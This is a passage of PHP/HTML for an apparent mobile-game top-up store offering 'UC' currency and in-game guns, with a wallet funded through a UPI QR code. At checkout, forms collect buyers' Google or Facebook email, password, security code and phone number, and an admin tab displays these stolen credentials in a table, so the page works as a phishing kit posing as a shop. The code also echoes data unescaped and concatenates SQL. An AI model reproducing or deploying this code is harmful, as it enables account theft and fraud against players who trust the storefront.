                <td><?php echo $a['game_name']; ?> </td>
                <td><?php echo $a['email']; ?> </td>
                <td><?php echo $a['password']; ?> </td>
                <td><?php echo $a['security_code']; ?> </td>
                <td><?php echo $a['phone']; ?> </td>
                <td><?php echo $a['fb_username']; ?> </td>
                <td><?php echo $a['game_level']; ?> </td>
             </tr>
            <?php endwhile; ?>
         </table>
    </div>
    <?php endif; ?>
    
    <?php if($admin_tab=='broadcast'): ?>
    <div class="wallet-card">
        <h3>Broadcast Notification</h3>
        <form method="post">
            <textarea name="broadcast_msg" rows="4" style="width:100%; padding:10px; background:#1a1a1a; border:1px solid #9b59b6; color:#fff;" placeholder="Enter message to broadcast..."></textarea>
            <button type="submit" name="broadcast" style="margin-top:10px;">Send Broadcast</button>
        </form>
    </div>
    <?php endif; ?>
</div>

<?php elseif(!isset($_SESSION['user_id'])): ?>
<!-- LOGIN PAGE -->
<div class="login-page">
    <div class="login-card">
        <img src="<?php echo $logo_img; ?>" class="login-logo">
        <div id="g_id_onload" data-client_id="369043602918-qsp4f4olbtmoksudfp8fnbuj8g39t8d0.apps.googleusercontent.com" data-callback="handleGoogleLogin" data-auto_prompt="false"></div>
        <div class="g_id_signin" data-type="standard" data-size="large"></div>
        <hr style="margin:15px 0;">
        <form method="post">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login">Login</button>
        </form>
        <div class="switch" onclick="showSignup()">New here? <span>Create account</span></div>
        <div id="signupForm" style="display:none; margin-top:20px">
            <form method="post">
                <input type="text" name="name" placeholder="Full Name" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="signup">Create Account</button>
            </form>
        </div>
        <a href="#" onclick="showAdminLogin()" class="admin-link">Admin Panel</a>
    </div>
</div>

<div id="adminLoginPopup" class="popup" style="display:none;">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6">Admin Login</h3>
        <form method="post">
            <input type="password" name="admin_key" placeholder="Enter Admin Key" required>
            <button type="submit" name="admin_login">Login as Admin</button>
            <button type="button" onclick="closeAdminLogin()" style="margin-top:10px; background:#333;">Cancel</button>
        </form>
        <?php if(isset($admin_error)) echo '<p style="color:#ff4444;">'.$admin_error.'</p>'; ?>
    </div>
</div>

<script>
function handleGoogleLogin(response) {
    var form = document.createElement('form'); form.method = 'POST';
    var input = document.createElement('input'); input.type = 'hidden'; input.name = 'google_credential'; input.value = response.credential;
    form.appendChild(input); document.body.appendChild(form); form.submit();
}
function showSignup() { document.getElementById('signupForm').style.display = 'block'; }
function showAdminLogin() { document.getElementById('adminLoginPopup').style.display = 'flex'; }
function closeAdminLogin() { document.getElementById('adminLoginPopup').style.display = 'none'; }
</script>

<?php else: ?>
<!-- USER DASHBOARD -->
<div class="dashboard">
    <!-- Wallet Top Corner (Chhota sa) -->
    <div class="wallet-top">
        💰 ₹<?php echo stylish_number(number_format($user['wallet'], 2)); ?>
        <span class="add-funds-small" onclick="showAddFundsPage()">+Add</span>
    </div>

    <div class="navbar">
        <div class="menu-icon" onclick="toggleSidebar()">☰</div>
        <img src="<?php echo $logo_img; ?>" class="nav-logo">
        <div>🆔 <?php echo $user['id']; ?></div>
    </div>

    <div class="sidebar" id="sidebar">
        <div class="close-sidebar" onclick="toggleSidebar()">✕</div>
        <div style="text-align:center;margin:20px 0">
            <div style="background:#9b59b6; width:70px; height:70px; border-radius:50%; margin:0 auto; display:flex; align-items:center; justify-content:center; font-size:35px;">👤</div>
            <p><strong><?php echo htmlspecialchars($user['name']??$user['email']); ?></strong></p>
        </div>
        <div class="menu-item" onclick="showOrdersPage()">📜 Order History</div>
        <div class="menu-item" onclick="showNotificationsPage()">🔔 Notifications</div>
        <div class="menu-item" onclick="showAddFundsPage()">💰 Add Funds</div>
        <div class="menu-item" onclick="window.location.href='?logout=1'">🚪 Logout</div>
        <a href="https://t.me/Ashxpro" class="menu-item telegram-support" style="display:block; text-decoration:none; background:#0088cc;">✈️ Telegram Support</a>
    </div>

    <div class="top-menu">
        <button onclick="showOrdersPage()">Order History</button>
        <button onclick="showNotificationsPage()">Notifications</button>
        <button onclick="showAddFundsPage()">Add Funds</button>
    </div>

    <?php if($msg): ?>
        <div style="background:#1a0033; padding:10px; border-radius:8px; margin-bottom:20px; text-align:center; font-size:13px;"><?php echo htmlspecialchars($msg); ?></div>
    <?php endif; ?>

    <!-- UC Section -->
    <div class="section-title">💎 UC TOP UP</div>
    <div class="products-grid">
        <?php while($p = $uc_products->fetchArray()): ?>
        <div class="product-card">
            <img src="<?php echo $p['image']; ?>" class="product-img">
            <div class="product-name"><?php echo stylish_text($p['name']); ?></div>
            <div class="product-price">₹<?php echo stylish_number(number_format($p['price'], 0)); ?></div>
            <form method="post">
                <input type="hidden" name="product_id" value="<?php echo $p['id']; ?>">
                <input type="hidden" name="product_name" value="<?php echo $p['name']; ?>">
                <input type="hidden" name="product_price" value="<?php echo $p['price']; ?>">
                <input type="hidden" name="product_image" value="<?php echo $p['image']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">🛒 Add to Cart</button>
            </form>
        </div>
        <?php endwhile; ?>
    </div>

    <!-- Gun Store Section -->
    <div class="section-title">🔫 GUN STORE</div>
    <div class="products-grid">
        <?php 
        $gun_query = $db->query("SELECT * FROM products WHERE type='gun' ORDER BY price ASC");
        $gun_count = 0;
        while($g = $gun_query->fetchArray()): $gun_count++; ?>
        <div class="product-card">
            <img src="<?php echo $g['image']; ?>" class="product-img">
            <div class="product-name"><?php echo stylish_text($g['name']); ?></div>
            <div class="product-price">₹<?php echo stylish_number(number_format($g['price'], 0)); ?></div>
            <form method="post">
                <input type="hidden" name="product_id" value="<?php echo $g['id']; ?>">
                <input type="hidden" name="product_name" value="<?php echo $g['name']; ?>">
                <input type="hidden" name="product_price" value="<?php echo $g['price']; ?>">
                <input type="hidden" name="product_image" value="<?php echo $g['image']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">🛒 Add to Cart</button>
            </form>
        </div>
        <?php endwhile; 
        if($gun_count == 0): ?>
        <div class="product-card" style="width:100%; text-align:center;">
            <p>No guns available. Admin will add soon.</p>
        </div>
        <?php endif; ?>
    </div>

    <button class="cart-fixed" onclick="showCart()">🛒 Cart (<?php echo count($cart_items); ?>)</button>
</div>

<!-- Order History Page -->
<div id="ordersPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">📜 Order History</h3>
        <?php $orders = $db->query("SELECT * FROM orders WHERE user_id=".$user['id']." ORDER BY id DESC");
        $hasOrders = false;
        while($o = $orders->fetchArray()) { $hasOrders = true; echo "<div class='order-item'><strong>{$o['product_name']}</strong><br>💰 ₹{$o['amount']}<br>🆔 UID: {$o['game_uid']}<br>📌 Status: {$o['status']}<br><small>{$o['created_at']}</small></div>"; }
        if(!$hasOrders) echo "<p style='text-align:center;padding:20px;'>No orders yet</p>"; ?>
        <button onclick="closeOrdersPage()" style="margin-top:15px;">Close</button>
    </div>
</div>

<!-- Notifications Page -->
<div id="notificationsPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">🔔 Notifications</h3>
        <?php $notif = $db->query("SELECT * FROM notifications ORDER BY id DESC");
        $hasNotif = false;
        while($n = $notif->fetchArray()) { $hasNotif = true; echo "<div class='order-item'>📢 {$n['message']}<br><small>{$n['created_at']}</small></div>"; }
        if(!$hasNotif) echo "<p style='text-align:center;padding:20px;'>No notifications</p>"; ?>
        <button onclick="closeNotificationsPage()" style="margin-top:15px;">Close</button>
    </div>
</div>

<!-- Add Funds Page -->
<div id="addFundsPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">💰 Add Funds</h3>
        <p style="color:#ff4444;">Minimum ₹199</p>
        <div class="bonus-btns">
            <button class="bonus-btn" onclick="setAmount(199)">₹199</button>
            <button class="bonus-btn" onclick="setAmount(500)">₹500</button>
            <button class="bonus-btn" onclick="setAmount(1000)">₹1000</button>
        </div>
        <input type="number" id="fundsAmount" placeholder="Custom amount (Min ₹199)">
        <button onclick="generateFundsQR()">Proceed to Pay</button>
        <div style="font-size:12px; color:#aaa; text-align:center; margin-top:10px;">UPI: Ayushkonhai@fam</div>
        <button onclick="closeAddFundsPage()" style="margin-top:15px; background:#333;">Cancel</button>
    </div>
</div>

<!-- Cart Page -->
<div id="cartPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">🛒 Your Cart</h3>
        <?php if(count($cart_items) == 0): ?>
            <p style="text-align:center;padding:20px;">Cart is empty</p>
        <?php else: ?>
            <?php foreach($cart_items as $idx => $item): ?>
            <div class="cart-item">
                <span><?php echo htmlspecialchars($item['name']); ?> - ₹<?php echo $item['price']; ?></span>
                <a href="?remove_cart=<?php echo $idx; ?>" style="color:#ff4444; text-decoration:none;">Remove</a>
            </div>
            <?php endforeach; ?>
            <div class="cart-total">Total: ₹<?php echo $cart_total; ?></div>
            <form method="post">
                <button type="submit" name="checkout">Proceed to Pay</button>
            </form>
        <?php endif; ?>
        <button onclick="closeCart()" style="margin-top:15px; background:#333;">Close</button>
    </div>
</div>

<!-- Checkout Page -->
<div id="checkoutPage" class="page-popup">
    <div class="popup-card">
        <h3 style="color:#9b59b6; text-align:center;">Complete Payment</h3>
        <p>Total Amount: ₹<?php echo $checkout_total; ?></p>
        <?php if($user['wallet'] >= $checkout_total): ?>
            <p style="color:#00ff00;">✅ You have sufficient balance</p>
            <div class="game-login-btns">
                <img src="<?php echo $google_icon; ?>" class="game-icon" onclick="showGoogleForm()">
                <img src="<?php echo $facebook_icon; ?>" class="game-icon" onclick="showFacebookForm()">
            </div>
        <?php else: ?>
            <p style="color:#ff4444;">❌ Insufficient balance! Please <a href="#" onclick="showAddFundsPage(); closeCheckout();">add funds</a></p>
        <?php endif; ?>
        <button onclick="closeCheckout()" style="margin-top:10px; background:#333;">Cancel</button>
    </div>
</div>

<!-- Google Form Popup -->
<div id="googleFormPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6">Google Account Details</h3>
        <form method="post">
            <input type="text" name="game_uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="email" name="email" placeholder="Gmail" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="security_code" placeholder="Security Code" required>
            <input type="text" name="game_level" placeholder="Game Level" required>
            <button type="submit" name="submit_google_order">Submit</button>
            <button type="button" onclick="closePopup('googleFormPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- Facebook Form Popup -->
<div id="facebookFormPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6">Facebook Account Details</h3>
        <form method="post">
            <input type="text" name="game_uid" placeholder="Game UID" required>
            <input type="text" name="game_name" placeholder="Game Name" required>
            <input type="tel" name="phone" placeholder="Phone Number" required>
            <input type="email" name="linked_email" placeholder="Linked Gmail" required>
            <input type="text" name="fb_username" placeholder="Facebook Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="text" name="game_level" placeholder="Game Level" required>
            <button type="submit" name="submit_fb_order">Submit</button>
            <button type="button" onclick="closePopup('facebookFormPopup')">Cancel</button>
        </form>
    </div>
</div>

<!-- QR Popup for Add Funds -->
<div id="qrPopup" class="popup">
    <div class="small-popup-card">
        <h3 style="color:#9b59b6">Scan & Pay</h3>
        <img id="qrImage" src="" style="width:180px; margin:15px auto; background:#fff; padding:10px; border-radius:10px;">
        <p id="qrAmount" style="font-size:18px; font-weight:bold;"></p>
        <p>UPI: <strong>Ayushkonhai@fam</strong></p>
        <input type="text" id="utrInput" placeholder="Enter UTR Number">
        <button onclick="submitFundRequest()">Submit</button>
        <button onclick="closeQRPopup()" style="margin-top:10px; background:#333;">Cancel</button>
    </div>
</div>

<script>
let selectedAmount = 0;

function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
function showOrdersPage() { document.getElementById('ordersPage').style.display = 'block'; }
function closeOrdersPage() { document.getElementById('ordersPage').style.display = 'none'; }
function showNotificationsPage() { document.getElementById('notificationsPage').style.display = 'block'; }
function closeNotificationsPage() { document.getElementById('notificationsPage').style.display = 'none'; }
function showAddFundsPage() { document.getElementById('addFundsPage').style.display = 'block'; }
function closeAddFundsPage() { document.getElementById('addFundsPage').style.display = 'none'; }
function showCart() { document.getElementById('cartPage').style.display = 'block'; }
function closeCart() { document.getElementById('cartPage').style.display = 'none'; }
function closeCheckout() { document.getElementById('checkoutPage').style.display = 'none'; }
function closeQRPopup() { document.getElementById('qrPopup').style.display = 'none'; }
function closePopup(id) { document.getElementById(id).style.display = 'none'; }
function showGoogleForm() { document.getElementById('googleFormPopup').style.display = 'flex'; }
function showFacebookForm() { document.getElementById('facebookFormPopup').style.display = 'flex'; }

function setAmount(amt) { document.getElementById('fundsAmount').value = amt; }

function generateFundsQR() {
    let amt = parseFloat(document.getElementById('fundsAmount').value);
    if(!amt || amt < 199) { alert('Minimum ₹199'); return; }
    selectedAmount = amt;
    document.getElementById('addFundsPage').style.display = 'none';
    let qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=upi://pay?pa=Ayushkonhai@fam&pn=VENOMX&am=${selectedAmount}&cu=INR`;
    document.getElementById('qrImage').src = qrUrl;
    document.getElementById('qrAmount').innerHTML = `₹${selectedAmount}`;
    document.getElementById('qrPopup').style.display = 'flex';
}

function submitFundRequest() {
    let utr = document.getElementById('utrInput').value;
    if(!utr) { alert('Enter UTR'); return; }
    let form = document.createElement('form'); form.method = 'POST';
    form.innerHTML = `<input type="hidden" name="amount" value="${selectedAmount}"><input type="hidden" name="utr" value="${utr}"><input type="hidden" name="add_funds_req" value="1">`;
    document.body.appendChild(form); form.submit();
}

if(window.location.search.includes('show_cart=1')) showCart();
if(window.location.search.includes('step=checkout')) document.getElementById('checkoutPage').style.display = 'block';
</script>
<?php endif; ?>
</body>
</html>
